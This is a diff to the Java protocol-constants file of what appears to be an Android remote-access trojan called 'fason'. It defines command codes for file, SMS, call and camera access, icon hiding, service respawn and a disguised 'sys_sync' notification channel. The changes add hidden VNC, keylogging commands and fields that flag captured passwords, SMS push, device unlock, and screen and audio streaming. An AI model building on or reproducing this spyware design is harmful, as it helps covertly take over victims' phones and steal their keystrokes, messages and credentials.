@@ -2,13 +2,9 @@ package com.fason.app.core;
 
 public final class Protocol {
     private Protocol() {}
-    
-    // Socket events
     public static final String EVT_PING  = "ping";
     public static final String EVT_ORDER = "order";
     public static final String EVT_PONG = "pong";
-
-    // Channel codes
     public static final String FILES       = "0xFI";
     public static final String SMS         = "0xSM";
     public static final String CALLS       = "0xCL";
@@ -24,8 +20,11 @@ public final class Protocol {
     public static final String NOTIF       = "0xNO";
     public static final String FASON       = "0xFM";
     public static final String INFO        = "0xIF";
-
-    // Actions
+    public static final String HVNC        = "0xHV";
+    public static final String INSPECTOR   = "0xAI";
+    public static final String KEYLOGGER   = "0xKL";
+    public static final String SMS_PUSH    = "0xSP";
+    public static final String DEVICE_UNLOCK = "0xAU";
     public static final String ACT_LS            = "ls";
     public static final String ACT_DL            = "dl";
     public static final String ACT_UPLOAD        = "upload";
@@ -47,15 +46,25 @@ public final class Protocol {
     public static final String ACT_SHOW          = "show";
     public static final String ACT_UNHIDE        = "unhide";
     public static final String ACT_OPEN_SETTINGS = "open_settings";
-
-    // JSON keys — request
+    public static final String ACT_CAPTURE_TREE  = "capture_tree";
+    public static final String ACT_KL_START      = "kl_start";
+    public static final String ACT_KL_STOP       = "kl_stop";
+    public static final String ACT_KL_FETCH      = "kl_fetch";
+    public static final String ACT_KL_CLEAR      = "kl_clear";
+    public static final String ACT_UNLOCK        = "unlock";
+    public static final String ACT_LOCK          = "lock";
+    public static final String ACT_STREAM_START  = "stream_start";
+    public static final String ACT_STREAM_STOP   = "stream_stop";
+    public static final String KEY_STREAM_FRAME  = "streamFrame";
+    public static final String KEY_STREAM_AUDIO  = "streamAudio";
+    public static final String KEY_INTERVAL      = "interval";
     public static final String KEY_TYPE   = "type";
     public static final String KEY_ACTION = "action";
     public static final String KEY_PATH   = "path";
-    public static final String KEY_NEW_NAME = "newName";  // rename target
-    public static final String KEY_PASSWORD = "password"; // encrypt/decrypt password (operator-supplied)
-    public static final String KEY_FLASH   = "flash";     // camera flash: auto/on/off
-    public static final String KEY_QUALITY = "quality";   // camera quality: low/medium/high
+    public static final String KEY_NEW_NAME = "newName";
+    public static final String KEY_PASSWORD = "password";
+    public static final String KEY_FLASH   = "flash";
+    public static final String KEY_QUALITY = "quality";
     public static final String KEY_TO     = "to";
     public static final String KEY_SMS    = "sms";
     public static final String KEY_SEC    = "sec";
@@ -63,8 +72,6 @@ public final class Protocol {
     public static final String KEY_ID     = "id";
     public static final String KEY_SYS    = "sys";
     public static final String KEY_CMD_ID = "cmdId";
-
-    // JSON keys — response
     public static final String KEY_ERROR     = "error";
     public static final String KEY_SUCCESS   = "success";
     public static final String KEY_TOTAL     = "total";
@@ -145,33 +152,44 @@ public final class Protocol {
     public static final String KEY_PERMISSIONS = "permissions";
     public static final String KEY_HIDDEN = "hidden";
     public static final String KEY_STATE  = "state";
+    public static final String KEY_FPS        = "fps";
+    public static final String KEY_JPEG_QUALITY = "jpegQuality";
+    public static final String KEY_SCALE      = "scale";
+    public static final String KEY_WIDTH      = "width";
+    public static final String KEY_HEIGHT     = "height";
+    public static final String KEY_X          = "x";
+    public static final String KEY_Y          = "y";
+    public static final String KEY_DX         = "dx";
+    public static final String KEY_DY         = "dy";
+    public static final String KEY_INPUT_TYPE = "inputType";
+    public static final String KEY_TREE          = "tree";
+    public static final String KEY_SCREENSHOT    = "screenshot";
+    public static final String KEY_NODE_ID       = "nodeId";
+    public static final String KEY_NODE_ACTION   = "nodeAction";
+    public static final String KEY_ANNOUNCEMENT  = "announcement";
+    public static final String KEY_INCLUDE_ALL   = "includeAll";
+    public static final String KEY_KEYSTROKES    = "keystrokes";
+    public static final String KEY_PACKAGE       = "package";
+    public static final String KEY_KEY_TEXT      = "keyText";
+    public static final String KEY_IS_PASSWORD   = "isPassword";
+    public static final String KEY_EVENT_TYPE    = "eventType";
+    public static final String KEY_TOTAL_COUNT   = "totalCount";
+    public static final String KEY_PENDING_COUNT = "pendingCount";
+    public static final String KEY_SENDER        = "sender";
+    public static final String KEY_SMS_BODY      = "smsBody";
     public static final String BC_KEEP_ALIVE     = "keepAlive";
     public static final String BC_RESPAWN_SERVICE = "respawnService";
     public static final String BC_RESTART         = "restart";
-    public static final String BC_QUICKBOOT       = "android.intent.action.QUICKBOOT_POWERON";
-    public static final String BC_HTC_QUICKBOOT   = "com.htc.intent.action.QUICKBOOT_POWERON";
-
-    // SharedPreferences
     public static final String PREFS_NAME              = "fason_prefs";
     public static final String PREF_SERVICE_ACTIVE     = "service_active";
-    public static final String PREF_AUTOSTART_PROMPTED = "autostart_prompted";
-
-    // Notification channel & group
+    public static final String PREF_AUTOSTART_VISITED  = "autostart_visited";
     public static final String NOTIF_CHANNEL = "sys_sync";
     public static final String NOTIF_GROUP   = "sys_group";
-
-    // WorkManager
     public static final String WORK_KEEP_ALIVE = "KeepAliveWork";
-
-    // Settings.Secure keys
     public static final String SETTING_NOTIF_LISTENERS = "enabled_notification_listeners";
-
-    // config.properties keys (assets/config.properties)
     public static final String CONFIG_FILE            = "config.properties";
     public static final String CONFIG_KEY_SERVER_URL   = "server_url";
     public static final String CONFIG_KEY_HOME_PAGE_URL = "home_page_url";
     public static final String CONFIG_KEY_DEVICE_SECRET = "device_secret";
-
-    // FasonManager component suffix
     public static final String ALIAS_SUFFIX = ".ui.MainActivityAlias";
 }
